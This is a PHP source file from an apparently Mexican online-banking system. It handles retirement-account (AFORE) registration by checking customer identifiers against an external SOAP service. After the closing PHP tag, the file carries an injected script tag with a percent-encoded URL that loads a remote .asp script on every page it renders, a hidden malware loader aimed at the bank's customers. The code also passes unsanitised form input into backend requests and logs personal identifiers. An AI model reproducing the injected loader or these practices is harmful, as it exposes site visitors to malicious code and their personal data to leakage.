<?php
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
require_once("nusoap-0.7.3/lib/nusoap.php");
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );
include_once( "classes/ezdatetime.php" );
include_once( "ezuserbb/classes/ezuser.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];
$ini =& INIFile::globalINI();

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
$SecureServer = $ini->read_var( "site", "SecureServer" );
$SecureServerType = $ini->read_var( "site", "SecureServerType" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$procesarWebservicesServer   =  $ini->read_var( "site", "procesarWebservicesServer" );
$procesarWebservicesUser     =  $ini->read_var( "site", "procesarWebservicesUserREG" );
$procesarWebservicesPassword =  $ini->read_var( "site", "procesarWebservicesPasswordREG" );
$procesarWebservicesBaseURLReg  =  $ini->read_var( "site", "procesarWebservicesBaseURLReg" );

$backend = "gw" . $ServerNumber. $DomainPostfix;
 


$user =& eZUserBB::currentUser();

// DebugBreak();
//Funcion para quitar caracteres no permitidos y pueda coicidir lo mayor posible con los datos retornados de procesar
function quitarespeciales(&$cadena){ 
$cadena1 = "";
   //compruebo que los caracteres sean los permitidos //JMRG SE ELIMINA LA Ñ DE LOS PERMITIDOS
   $permitidos = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_ ";
   for ($i=0; $i<strlen($cadena); $i++){ 
      if (strpos($permitidos, substr($cadena,$i,1))===false){       
          $cadena{$i} = "";
      }
      else{
      $cadena1 .= substr($cadena,$i,1);
      }
   }
   $cadena = $cadena1;
   return; 
} 

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "registro.php" );

    $t->setAllStrings();

	$dateTime  = new eZDateTime( );
	$timeStamp = $dateTime->timeStamp();
	$time =& date('H:i:s', $timeStamp );
	$date =& date('jMY', $timeStamp );

    $t->set_file( array(
        "registro_tpl" => "registro.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
		
	if(!empty($_POST['Parent1']))
		$Parent1 = $_POST['Parent1'];
		
	if(!empty($_POST['desc1']))
		$desc1 = $_POST['desc1'];
		
	if(!empty($_POST['desc2']))
		$desc2 = $_POST['desc2'];
		
	if(!empty($_POST['Pos']))
		$Pos = $_POST['Pos'];
		
	if(!empty($_POST['Respuesta']))
		$Respuesta = $_POST['Respuesta'];
		
	if(!empty($_POST['code']))
		$code = $_POST['code'];
		
	if(!empty($_POST['RenInt']))
		$RenInt = $_POST['RenInt'];
//HB
// ---------------- Inicio Proceso
    if(empty($Access)) {
        $Access = "FrAc";
    }
    if(empty($Parent1)) {
        $Parent1 = "";
    }
    switch($Access) 
	{
    case "FrAc":
        $particularFields = "";
        $tr->blog($qki,"Registro", $Access);
        break;

    case "Confirm":  
    		$particularFields = "&desc1=".$desc1."&Parent1=".$Parent1."&desc2=".$desc2;
    		$tr->blog($qki,"Registro", $desc1,$Access);
        break;   
    case "Process":
    $respuesta2 = "9";
    $particularFields ="&DiasPzo=".($respuesta2)."&desc1=".($desc1)."&Desc=".($respuesta)."&Pos=".$Pos."&Parent1=".($Parent1)."&rfc=".($rfc)."&RenInt=".($RenInt)."&PAN=".($nss)."&desc2=".($desc2)."&Passwd=".encrypt( $code, strtolower( $usr ) );
    
  	$transaccion_buffer = "";
    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=reg&Access=".$Access."&CustID=".$usr."&Cadpriv=".$priv.$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // Registro
	if (
         strpos($transaccion_buffer,"C&oacute;digo: (71") != false or
         strpos($transaccion_buffer,"C&oacute;digo: (3011") != false or         
         strpos($transaccion_buffer,"C&oacute;digo: (9613") != false
     )
  {
//   print_r("Amonos a la ...");
   $error_ASB = 1;
   break;
  }
  else
  {
  $error_ASB = 0;
  }
    $respuesta2 = "0";
// ---------------- Datos de usuario, password y webservice
		$endpoint = $procesarWebservicesServer .$procesarWebservicesBaseURLReg . 'SolicitudRegistro';
    
		if ( strlen( $procesarWebservicesUser ) > 7 ) {
			$procesarWebservicesUser = substr( $procesarWebservicesUser,  0, 7 );
		} else {
			$procesarWebservicesUser = str_pad( $procesarWebservicesUser, 7, " " );
		}
		if ( strlen( $procesarWebservicesPassword ) > 7 ) {
			$procesarWebservicesPassword = substr( $procesarWebservicesPassword, 0, 7 );
		} else {
			$procesarWebservicesPassword = str_pad( $procesarWebservicesPassword, 7, " " );
		}
		if ( strlen( $Pos ) > 16 ) {
			$Pos = substr( $Pos,  0, 16 );
		} else {
			$Pos = str_pad( $Pos, 16, "0" );
		}

// ---------------- peticion lleva la primer cadena para la primer peticion de datos
		$peticion = $procesarWebservicesUser . "&" . $procesarWebservicesPassword . "&" . $desc1;
// ---------------- Creacion de objeto para envio de datos
		$datos = new soapclient( $endpoint,null ,null ,null ,null ,null ,180 ,90 ,null);

		$method = 'consultar';

		if ( $GLOBALS["DEBUGA"] == true ) 
		{
				eZLog::writeNotice( "En registro de eztransaccion/user registro (endpoint) ->" . print_r( $endpoint, true ) . "|" );
				eZLog::writeNotice( "En registro de eztransaccion/user registro (peticion) ->" . print_r( $peticion, true ) . "|" );
				eZLog::writeNotice( "En registro de eztransaccion/user registro   (method) ->" . print_r( $method, true   ) . "|" );
		}
    
		$params = array( 'clave_del_usuario_amp_clave_de_seguridad_amp_folio_solicitud_registro' => $peticion );

		$timeini		    = date( "H:i:s" );
		list( $usec, $sec )	= explode( " ", microtime() );
		$usini				= substr( $usec, 2);

// ---------------- Enviamos la peticion y recibimos la respuesta en ans
		$ans = $datos->call( $method, $params );
//		$ans = '12&07816217041&LURA800129HGTNSL00&LUNA$RaIOS$JOSE ALEJANDRO&LURA800129HGT';

    if( trim($ans) == "")
    {
     eZLog::writeNotice( "En REGISTRO,no hay Respuesta |Consultar|" . $ans . "|" . $desc1 . "|" . date( "H:i:s" ));
 		 $ans = $datos->call( $method, $params );    
    }

    $respuesta = $ans;

		$timefin		    = date( "H:i:s" );
		list( $usec, $sec )	= explode( " ", microtime() );
		$usfin				= substr( $usec, 2);

// ---------------- Recibimos mensajes 01 o 02
//                  Respuesta&NSS&CURP&Ap paterno$Ap materno$Nombre&RFC
//		$ans = '01&07816217041&CAFE621115HPLRLG00&CARRANZA$FLORES$EUGENIO LUIS&CAFE621115';

// ---------------- Verifica si hubo error en el envio
    if ($datos->fault) 
      { 
        $respuesta = "97"; //error de conexion
        eZLog::writeNotice("En REGISTRO, Error en el envio (97) metodo consultar");
      } 
    else 
      {
        $sError = $datos->getError();    // Hay algun error ?
        if ($sError != false)
        {
        if (strpos($sError, 'timed out') === false)
        {
          $respuesta = "97"; //error de conexion
          eZLog::writeNotice("En REGISTRO, Hay un Error (97) metodo consultar");
        }
        else
        {
          $respuesta = "98"; //tiempo de respuesta excedido
        }
        eZLog::writeNotice( "En REGISTRO,no hay conexion con PROCESAR|Consultar|" . $respuesta . "|" . $desc1 . "|" . date( "H:i:s" ) . "|" . $sError);

        $particularFields ="&DiasPzo=".($respuesta2)."&desc1=".($desc1)."&Desc=".($respuesta)."&Pos=".$Pos."&Parent1=".($Parent1)."&rfc=".($rfc)."&RenInt=".($RenInt)."&PAN=".($nss)."&desc2=".($desc2)."&Passwd=".encrypt( $code, strtolower( $usr ) );
        $tr->blog($qki,"Registro", trim($respuesta),$timeini.$usini, $timefin.$usfin, $sError, $desc1, $Pos);
  			break;
        }
      }
    $tr->blog($qki,"Registro", trim($respuesta),$timeini.$usini, $timefin.$usfin, $desc1 );

// ---------------- Registro en bitacora	
		if ( $GLOBALS["DEBUGA"] == true ) 
		{
			eZLog::writeNotice( "En registro de eztransaccion/user registro comprobando identificacion del trabajador (ans) ->" . print_r( $ans, true ) . "|" );
		}

		$nombre = trim($Parent1);
		$curp   = $RenInt;
    $rfc    = $rfc;
    quitarespeciales($nombre);
    quitarespeciales($curp);
    quitarespeciales($rfc);
    
// ---------------- Vaciamos en las variables los valores de la respuesta que vienen en ans
	     list( $respuesta, $nss, $curp_p, $name_p, $rfc_p ) = explode( "&", $ans );
       $curp_p = strtoupper($curp_p);
       quitarespeciales( $curp_p );
       
       $rfc_p = strtoupper($rfc_p);
       quitarespeciales( $rfc_p );
// ---------------- en nombre vaciamos la cadena con el nombre del trabajador
	     list( $paterno_p, $materno_p, $nombre_p) = explode( "$", $name_p );
	     $nombre_p = strtoupper( trim( trim($nombre_p) . " " . trim($paterno_p) . " " . trim($materno_p) ) );
       quitarespeciales( $nombre_p );
// ---------------- escribimos en bitacora los valores
		if ( $GLOBALS["DEBUGA"] == true ) 
		{
			eZLog::writeNotice( "En registro de eztransaccion/user (ans) ->      " . print_r( $ans, true ) . "|" );
			eZLog::writeNotice( "En registro de eztransaccion/user (nss) ->      " . print_r( $nss, true ) ."|" );
			eZLog::writeNotice( "En registro de eztransaccion/user (curp_p) ->   " . print_r( $curp_p, true ) ."|" );
			eZLog::writeNotice( "En registro de eztransaccion/user (nombre_p) -> " . print_r( $nombre_p, true ) ."|" );
			eZLog::writeNotice( "En registro de eztransaccion/user (rfc_p) ->    " . print_r( $rfc_p, true ) ."|" );
		}
// ---------------- Comparamos los datos recibidos de consar contra los que tenemos en ovation
// ---------------- respondemos a procesar si es el mismo trabajador(01) o no (02)
if ( $respuesta == "12")
{
      if ( substr($curp_p, 0, 16) == substr($curp, 0, 16))
        $curp_ok = 4;
      else
        $curp_ok = 0;
      
      if ( $nombre_p == $nombre )
        $nombre_ok = 2;
      else
        $nombre_ok = 0;
        
      if ( substr($rfc_p, 0, 10) == substr($rfc, 0, 10) )
        $rfc_ok = 1;
      else
        $rfc_ok = 0;
        
      $valida = $curp_ok + $nombre_ok + $rfc_ok;
      
      if ( $valida == 7)
        {
          $peticion2 = $procesarWebservicesUser . "&" . $procesarWebservicesPassword . "&" . $Pos . "&" . $desc1 . "&" . "1";
        }
      else
        {
          $peticion2 = $procesarWebservicesUser . "&" . $procesarWebservicesPassword . "&" . $Pos . "&" . $desc1 . "&" . "2";
          eZLog::writeNotice( "En REGISTRO,Datos no Coinciden|Consultar|" . $desc1 . "|" . date( "H:i:s" ) . "|" . $curp . ":" . $curp_p . ":" . $nombre . ":" . $nombre_p . ":" . $rfc . ":" . $rfc_p);
          $valida += 30;
        }

		$params2 = array( 'clave_del_usuario_amp_clave_de_seguridad_amp_folio_de_la_autorizacion_para_registro_amp_folio_de_solicitud_electronica_de_registro_amp_resultado_de_verificacion' => $peticion2 );
    $method = 'confirmar';

// ---------------- Envio de Mensaje numero 2 con datos a procesar y recepcion de respuesta de procesar (01) Exito (02) Error
  $ans2 = $datos->call( $method, $params2 ); //Quitar comentarios para pruebas con procesar
//$ans2 = "01";
  $respuesta2 = substr($ans2,0 ,2 );
  if ($respuesta2 == "99") 
    {
      $respuesta2 = "01";
    }
  if ($valida >= 30)
    {
      $respuesta2 = $valida;
    }
// ---------------- Devolvemos la respuesta
// ---------------- Si hubo cualquier errror se devuelve a bajionet para que lo muestre
    if ($datos->fault)
      { 
        $respuesta2 = "97"; //error de conexion      
        eZLog::writeNotice("En REGISTRO, Error en el envio (97) metodo confirmar");
      } 
    else 
      {
        $sError = $datos->getError();    // Hay algun error ?
        if ($sError != false)
        {
        if (strpos($sError, 'timed out') === false )	
        {
          eZLog::writeNotice("En REGISTRO, Hay un Error (97) metodo confirmar");
          $respuesta2 = "97"; //error de conexion
        }
        else
        {
          $respuesta2 = "98"; //tiempo de respuesta excedido        
        }
        eZLog::writeNotice( "En REGISTRO,no hay conexion con PROCESAR|Confirmar|" . $desc1 . "|" . date( "H:i:s" ) . "|" . $sError);
        $particularFields ="&DiasPzo=".($respuesta2)."&desc1=".($desc1)."&Desc=".($respuesta)."&Pos=".$Pos."&Parent1=".($Parent1)."&rfc=".($rfc)."&RenInt=".($RenInt)."&PAN=".($nss)."&desc2=".($desc2)."&Passwd=".encrypt( $code, strtolower( $usr ) );        
   			$tr->blog($qki,"Registro", $respuesta2,$timeini.$usini, $timefin.$usfin, $sError, $desc1, $Pos);
  			break;
        }
      }
}

   $particularFields ="&DiasPzo=".($respuesta2)."&desc1=".($desc1)."&Desc=".($respuesta)."&Pos=".$Pos."&Parent1=".($Parent1)."&rfc=".($rfc)."&RenInt=".($RenInt)."&PAN=".($nss)."&desc2=".($desc2)."&Passwd=".encrypt( $code, strtolower( $usr ) );
	 $tr->blog($qki,"Registro", $respuesta2, $Parent1, $desc1, $Pos, $particularFields);
	 break;
  }
if ( $error_ASB != 1 )
{
	$transaccion_buffer = "";
	$ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=reg&Access=".$Access."&CustID=".$usr."&Cadpriv=".$priv.$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // Registro
}
// ---------------- Si la repuesta fue (01) Exito Se envia la respuesta a Bajionet y el recibo a pantalla 
	if ($Access == "Process" and $respuesta2 == "01" and strpos($transaccion_buffer,"FELICIDADES") != false)
	{
		$buffer2 = str_replace(chr(34),chr(92).chr(34),$transaccion_buffer);
		$Pagina = "<SCRIPT LANGUAGE='JavaScript'> function ventana() { var windowW = 800; var windowH = 450; var windowX = 10; var windowY = 10; var title = 'Recibo'; s = 'width='+windowW+',height='+windowH; cadena=\"<HTML><HEAD><link REL='STYLESHEET' HREF='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/recibos.css' TYPE='text/css'><TITLE>Comprobante Registro AFORE AFIRME BAJIO.</TITLE>";
		$Pagina = $Pagina."<SCRIPT LANGUAGE='JavaScript'> function window_onbeforeprint() { Imprimir.style.visibility = 'hidden'; Salir.style.visibility = 'hidden';} function window_onafterprint() { Imprimir.style.visibility = 'visible'; Salir.style.";
		$Pagina = $Pagina."visibility = 'visible'; }\"+\"<\"+\"/\"+\"SCRIPT></HEAD><BODY LANGUAGE='javascript' onbeforeprint='return window_onbeforeprint()' onafterprint='return window_onafterprint()'>";
		$Pagina = $Pagina."<INPUT type='button' value='Imprimir' id=Imprimir name=Imprimir onclick='window.print();'>&nbsp;<INPUT type='button' value=' Salir  ' id=Salir name=Salir onclick='window.close();'>";
		$Pagina = $Pagina."<BR>";
		$Pagina = $Pagina."<P><CENTER>";
		$Pagina = $Pagina."<IMG SRC='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/LOGO_BB.GIF' ALIGN= 'TOP' Banco del Bajio>";
		$Pagina = $Pagina."</P></CENTER>";
		$Pagina = $Pagina."<H2>Comprobante Registro AFORE AFIRME BAJIO</H2>";
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<P ALIGN='RIGHT'><B><FONT>$date $time</FONT></B></P>";
		$Pagina = $Pagina.$buffer2;
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<p><FONT SIZE=1>Av. Manuel J. Clouthier No. 508 Col. Jardines del Campestre CP 37128 León, Gto.</FONT> </p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>Consultas y aclaraciones 01 (477) 710- 4600 o al 01 (800) 471-0400</FONT></p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>EL REGISTRO A LA QUE HACE REFERENCIA ESTE COMPROBANTE FUE REALIZADO CONFORME A LA INFORMACIÓN E INSTRUCCIONES QUE NUESTRO CLIENTE ALIMENTÓ EN EL SISTEMA DE BANCO DEL BAJÍO, POR LO TANTO EL CLIENTE ES EL ÚNICO RESPONSABLE PRESENTE Y FUTURO POR CUALQUIER ERROR U OMISIÓN EN ESTA OPERACIÓN.</FONT></P>";
		$Pagina = $Pagina."</BODY></HTML>\"; NFW =";
		$Pagina = $Pagina." window.open(\"\",'Recibo',\"toolbar=no,menubar=no,scrollbars=2,\"+s); NFW.blur(); NFW.resizeTo(windowW,windowH); NFW.moveTo(windowX,windowY); NFW.";
		$Pagina = $Pagina."document.open(); NFW.document.write(cadena); NFW.document.close(); NFW.window.focus(); } ventana(); </SCRIPT>";
	}

    $t->set_var( "transaccion_buffer", $transaccion_buffer.$Pagina );
    $t->pparse( "output", "registro_tpl" );

// ---------------- Fin Proceso
}
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/registro/" );

    $t->pparse( "output", "user_login_tpl" );
}

?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>